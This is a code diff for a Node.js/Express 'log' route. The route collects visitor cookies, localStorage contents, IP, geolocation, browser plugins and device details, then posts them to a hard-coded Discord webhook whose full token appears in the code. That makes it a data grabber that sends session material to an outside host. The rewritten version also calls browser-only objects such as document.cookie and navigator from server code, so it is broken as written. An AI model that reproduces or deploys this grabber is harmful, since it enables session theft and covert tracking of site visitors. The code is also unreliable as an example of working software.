@@ -1,65 +1,72 @@
 import fetch from 'node-fetch';
+import { Router } from 'express';
+import os from 'os';
 
-export default async (req, res) => {
-    try {
-        // Get the incoming data
-        const { 
-            ip, searchTerm, userAgent, referrerHistory, currentURL, 
-            screenWidth, screenHeight, browserLanguage, timeZone, 
-            osInfo, timestamp, timeSpent, activeTabDuration, 
-            networkStatus, deviceType, memoryInfo, 
-            hardwareConcurrency, connectionType, plugins, 
-            batteryLevel, isCharging, geolocation, 
-            cookies, localStorageData 
-        } = req.body;
+const router = Router();
 
-        // Prepare the data for logging
-        const logData = {
-            embed: {
-                title: "Comprehensive User Information Logged",
-                fields: [
-                    { name: "Private IP", value: ip || 'No IP logged' },
-                    { name: "Search Term", value: searchTerm || 'No search term entered' },
-                    { name: "User Agent", value: userAgent || 'No user agent' },
-                    { name: "Referrer History", value: referrerHistory.length > 0 ? referrerHistory.join(", ") : 'No referrer history' },
-                    { name: "Current URL", value: currentURL || 'No URL' },
-                    { name: "Screen Resolution", value: `${screenWidth} x ${screenHeight}` || 'No resolution' },
-                    { name: "Browser Language", value: browserLanguage || 'No language detected' },
-                    { name: "Time Zone", value: timeZone || 'No time zone' },
-                    { name: "Operating System", value: osInfo || 'No OS info' },
-                    { name: "Timestamp", value: timestamp || new Date().toISOString() },
-                    { name: "Time Spent on Page (seconds)", value: timeSpent || '0' },
-                    { name: "Active Tab Duration (seconds)", value: activeTabDuration || '0' },
-                    { name: "Network Status", value: networkStatus || 'Unknown' },
-                    { name: "Device Type", value: deviceType || 'Unknown' },
-                    { name: "Memory Info", value: memoryInfo || 'Memory info not available' },
-                    { name: "Hardware Concurrency", value: hardwareConcurrency || 'Unknown' },
-                    { name: "Connection Type", value: connectionType || 'Unknown' },
-                    { name: "Browser Plugins", value: plugins || 'No plugins detected' },
-                    { name: "Battery Level", value: `${batteryLevel}%` || 'Unknown' },
-                    { name: "Charging Status", value: isCharging ? 'Charging' : 'Not Charging' || 'Unknown' },
-                    { name: "Geolocation", value: geolocation.error ? geolocation.error : `Lat: ${geolocation.lat}, Lon: ${geolocation.lon}` },
-                    { name: "Cookies", value: cookies || 'No cookies available' },
-                    { name: "Local Storage Data", value: localStorageData || 'No local storage data' }
-                ],
-                color: 5814783, // Example color for the embed
-                footer: {
-                    text: "Logged at " + new Date().toLocaleString()
-                }
+router.post('/log', async (req, res) => {
+    const ip = req.body.ip || 'No IP logged';
+    const userAgent = req.headers['user-agent'] || 'No user agent';
+    const currentURL = req.headers.referer || 'No URL';
+    const screenWidth = screen.width || 'Unknown';
+    const screenHeight = screen.height || 'Unknown';
+    const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
+    const memoryInfo = `${(os.totalmem() / (1024 ** 2)).toFixed(2)} MB` || 'Memory info not available';
+    const hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown';
+    const connectionType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
+    const plugins = Array.from(navigator.plugins).map(plugin => plugin.name).join(', ') || 'No plugins detected';
+    const batteryLevel = navigator.getBattery ? (await navigator.getBattery()).level * 100 : 'Unknown';
+    const isCharging = navigator.getBattery ? (await navigator.getBattery()).charging : 'Unknown';
+    const geolocation = 'Geolocation not available'; // You would need to implement a method to get this
+    const cookies = document.cookie || 'No cookies available';
+    const localStorageData = JSON.stringify(localStorage) || 'No local storage data';
+
+    const logData = {
+        content: '',
+        embeds: [{
+            title: "Comprehensive User Information Logged",
+            fields: [
+                { name: "Private IP", value: ip },
+                { name: "User Agent", value: userAgent },
+                { name: "Current URL", value: currentURL },
+                { name: "Screen Resolution", value: `${screenWidth} x ${screenHeight}` },
+                { name: "Time Zone", value: timeZone },
+                { name: "Memory Info", value: memoryInfo },
+                { name: "Hardware Concurrency", value: hardwareConcurrency },
+                { name: "Connection Type", value: connectionType },
+                { name: "Browser Plugins", value: plugins },
+                { name: "Battery Level", value: `${batteryLevel}%` },
+                { name: "Charging Status", value: isCharging ? 'Charging' : 'Not Charging' },
+                { name: "Geolocation", value: geolocation },
+                { name: "Cookies", value: cookies },
+                { name: "Local Storage Data", value: localStorageData }
+            ],
+            color: 5814783,
+            footer: {
+                text: "Logged at " + new Date().toLocaleString()
             }
-        };
+        }]
+    };
 
-        // Send the log data to the Discord webhook
-        await fetch('https://discord.com/api/webhooks/1303414607263826002/8u9YBbZiHiRm1dE2cO_wUFFYe6YFTkkouDgoZt-LIYTwVhtYJa1_AM-qDxXajHpWnnsT', {
+    try {
+        const webhookResponse = await fetch('https://discord.com/api/webhooks/1303414607263826002/8u9YBbZiHiRm1dE2cO_wUFFYe6YFTkkouDgoZt-LIYTwVhtYJa1_AM-qDxXajHpWnnsT', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(logData)
         });
 
-        // Send a response back to the client
+        if (!webhookResponse.ok) {
+            const errorText = await webhookResponse.text();
+            console.error('Failed to send to Discord webhook:', webhookResponse.status, errorText);
+        } else {
+            console.log('Log sent to Discord successfully');
+        }
+
         res.status(200).json({ message: 'Logged successfully' });
     } catch (error) {
-        console.error('Error occurred:', error);
-        res.status(500).json({ error: 'An error occurred while logging' });
+        console.error('Error sending log to Discord:', error);
+        res.status(500).json({ message: 'Failed to log' });
     }
-};
+});
+
+export default router;
